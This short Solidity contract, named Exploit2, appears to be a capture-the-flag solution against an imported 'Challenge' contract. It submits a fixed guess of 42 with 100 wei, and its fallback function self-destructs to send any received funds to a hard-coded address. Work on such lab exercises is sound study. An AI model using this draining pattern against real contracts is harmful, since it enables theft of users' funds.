
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.4;

import "./Challenge.sol";

contract Exploit2 {
    uint8 guess = 42;
    address signer = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
    Challenge public exploit;
    address public target;

    constructor(address _instance) {
        exploit = Challenge(_instance);
        target = _instance;   
    }
    
    function solve() public payable
    {
        require(msg.value == 100 wei);
        exploit.guess{value: 100 wei}(guess);
    }

    fallback() external payable{

        selfdestruct(payable(signer));
    }
    
    
}

